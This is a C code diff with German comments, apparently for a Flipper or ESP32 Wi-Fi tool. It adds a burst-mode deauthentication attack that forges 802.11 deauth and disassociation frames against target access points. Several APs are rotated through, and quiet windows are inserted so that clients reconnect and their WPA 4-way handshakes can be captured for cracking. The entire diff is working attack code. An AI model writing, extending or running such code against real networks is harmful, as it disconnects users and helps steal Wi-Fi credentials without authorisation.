@@ -57,6 +57,15 @@ static const uint8_t deauth_tmpl[26] = {
 };
 static const uint8_t deauth_reasons[] = {0x01, 0x04, 0x06, 0x07, 0x08};
 
+// Burst-Mode: kurzes Feuer, dann Stille, damit STA reconnecten und den 4-way
+// Handshake komplettieren kann (sonst fliegt sie immer wieder vor M2/M3 raus).
+// 8 Frame-Pairs ≈ 16 Frames werfen jede STA verlässlich raus; 3 s Stille reicht
+// für Auth+Assoc+4-way (~500 ms–2 s).
+#define HS_BURST_PAIRS         8
+#define HS_BURST_FRAME_GAP_MS  5
+#define HS_BURST_QUIET_MS      3000
+#define HS_BURST_QUIET_TICK_MS 100
+
 static uint8_t s_frame_deauth[26];
 static uint8_t s_frame_disassoc[26];
 static FuriThread* s_deauth_thread = NULL;
@@ -146,28 +155,121 @@ static File* hs_open_pcap(Storage* storage, const char* dir, const char* safe_ss
 // ---------------------------------------------------------------------------
 // Deauth-Thread (Single-Mode)
 // ---------------------------------------------------------------------------
+// Wartet HS_BURST_QUIET_MS in kleinen Schritten und bricht früh ab, sobald
+// der Hauptthread Stop angefordert hat. Während dieser Stille hat die STA
+// die Chance, den 4-way Handshake abzuschließen.
+static void hs_deauth_quiet_window(WlanApp* app) {
+    uint32_t ticks = HS_BURST_QUIET_MS / HS_BURST_QUIET_TICK_MS;
+    for(uint32_t i = 0; i < ticks && app->handshake_deauth_running; i++) {
+        furi_delay_ms(HS_BURST_QUIET_TICK_MS);
+    }
+}
+
+// Schickt einen Deauth+Disassoc-Pair-Burst mit verschiedenen Reasons.
+// f_deauth muss vorgefüllt sein (RA/TA/BSSID gesetzt). f_disassoc wird
+// daraus abgeleitet (gleiche Adressen, nur subtype-Byte anders).
+static uint32_t hs_deauth_burst(WlanApp* app, uint8_t* f_deauth) {
+    uint8_t f_disassoc[26];
+    memcpy(f_disassoc, f_deauth, 26);
+    f_disassoc[0] = 0xa0;
+    uint32_t sent = 0;
+    for(int i = 0; i < HS_BURST_PAIRS && app->handshake_deauth_running; i++) {
+        uint8_t reason = deauth_reasons[i % (sizeof(deauth_reasons))];
+        f_deauth[24] = reason;
+        f_disassoc[24] = reason;
+        if(wlan_hal_send_raw(f_deauth, 26)) {
+            app->handshake_deauth_count++;
+            sent++;
+        }
+        if(wlan_hal_send_raw(f_disassoc, 26)) {
+            app->handshake_deauth_count++;
+            sent++;
+        }
+        furi_delay_ms(HS_BURST_FRAME_GAP_MS);
+    }
+    return sent;
+}
+
 static int32_t hs_deauth_thread_fn(void* arg) {
     WlanApp* app = arg;
-    uint32_t cycle = 0;
+    uint32_t burst_no = 0;
+    uint32_t no_target_log_count = 0;
+    ESP_LOGI(TAG, "deauth thread: started (channel_mode=%d, burst=%dx pair, quiet=%dms)",
+        s_use_channel_mode, HS_BURST_PAIRS, HS_BURST_QUIET_MS);
+
     while(app->handshake_deauth_running) {
-        uint8_t reason = deauth_reasons[cycle % 5];
-        s_frame_deauth[24] = reason;
-        s_frame_disassoc[24] = reason;
-        if(wlan_hal_send_raw(s_frame_deauth, 26)) app->handshake_deauth_count++;
-        if(wlan_hal_send_raw(s_frame_disassoc, 26)) app->handshake_deauth_count++;
-        cycle++;
-        furi_delay_ms(5);
+        if(s_use_channel_mode) {
+            uint8_t count = s_hsc_target_count;
+            if(count > HSC_MAX_TARGETS) count = HSC_MAX_TARGETS;
+            if(count == 0) {
+                if((no_target_log_count++ & 0x1F) == 0) {
+                    ESP_LOGW(TAG, "deauth thread: no targets yet — waiting");
+                }
+                furi_delay_ms(200);
+                continue;
+            }
+            // Pro Burst zur nächsten BSSID rotieren — jeder AP bekommt einen
+            // ganzen Burst (16 Frames) am Stück, dann Stille.
+            uint8_t idx = burst_no % count;
+            uint8_t bssid[6];
+            memcpy(bssid, s_hsc_targets[idx].bssid, 6);
+
+            uint8_t f[26];
+            memcpy(f, deauth_tmpl, 26);
+            memcpy(&f[10], bssid, 6);
+            memcpy(&f[16], bssid, 6);
+
+            uint32_t sent = hs_deauth_burst(app, f);
+            if((burst_no & 0x03) == 0) {
+                ESP_LOGI(TAG,
+                    "burst #%lu targets=%u idx=%u "
+                    "bssid=%02x:%02x:%02x:%02x:%02x:%02x sent=%lu total=%lu",
+                    (unsigned long)burst_no, count, idx,
+                    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
+                    (unsigned long)sent,
+                    (unsigned long)app->handshake_deauth_count);
+            }
+        } else {
+            // Single-Mode: BSSID ist in s_frame_deauth schon gesetzt (hs_init_single).
+            // Wir kopieren in einen lokalen Buffer, damit hs_deauth_burst beide
+            // Frames daraus baut.
+            uint8_t f[26];
+            memcpy(f, s_frame_deauth, 26);
+            uint32_t sent = hs_deauth_burst(app, f);
+            if((burst_no & 0x03) == 0) {
+                ESP_LOGI(TAG, "burst #%lu single sent=%lu total=%lu",
+                    (unsigned long)burst_no, (unsigned long)sent,
+                    (unsigned long)app->handshake_deauth_count);
+            }
+        }
+        burst_no++;
+
+        // Stille — STA bekommt Chance auf Reconnect + 4-way.
+        hs_deauth_quiet_window(app);
     }
+    ESP_LOGI(TAG, "deauth thread: exiting (bursts=%lu sent=%lu)",
+        (unsigned long)burst_no, (unsigned long)app->handshake_deauth_count);
     return 0;
 }
 
 static void hs_start_deauth(WlanApp* app) {
-    if(s_deauth_thread) return;
+    if(s_deauth_thread) {
+        ESP_LOGI(TAG, "start_deauth: already running");
+        return;
+    }
     // Im Single-Mode nur wenn Capture läuft; im Channel-Mode immer erlaubt.
-    if(!s_use_channel_mode && !app->handshake_running) return;
+    if(!s_use_channel_mode && !app->handshake_running) {
+        ESP_LOGW(TAG, "start_deauth: single mode, capture not running — skip");
+        return;
+    }
     // Im Channel-Mode mit Hopping=ON ist Deauth gesperrt — Channel würde mitten
     // im Deauth-Stream wechseln und der Effekt verpufft.
-    if(s_use_channel_mode && app->hs_settings.hopping) return;
+    if(s_use_channel_mode && app->hs_settings.hopping) {
+        ESP_LOGW(TAG, "start_deauth: channel mode + hopping ON — blocked");
+        return;
+    }
+    ESP_LOGI(TAG, "start_deauth: spawning thread (channel_mode=%d targets=%u)",
+        s_use_channel_mode, s_hsc_target_count);
     app->handshake_deauth_running = true;
     app->handshake_deauth_count = 0;
     s_deauth_thread = furi_thread_alloc();
@@ -176,8 +278,6 @@ static void hs_start_deauth(WlanApp* app) {
     furi_thread_set_context(s_deauth_thread, app);
     furi_thread_set_callback(s_deauth_thread, hs_deauth_thread_fn);
     furi_thread_start(s_deauth_thread);
-    // Channel-Hopping wird ausschließlich durch Settings.hopping gesteuert,
-    // Deauth-Start ändert hier nichts.
 }
 
 static void hs_stop_deauth(WlanApp* app) {
@@ -185,6 +285,7 @@ static void hs_stop_deauth(WlanApp* app) {
         app->handshake_deauth_running = false;
         return;
     }
+    ESP_LOGI(TAG, "stop_deauth: joining thread");
     app->handshake_deauth_running = false;
     furi_thread_join(s_deauth_thread);
     furi_thread_free(s_deauth_thread);
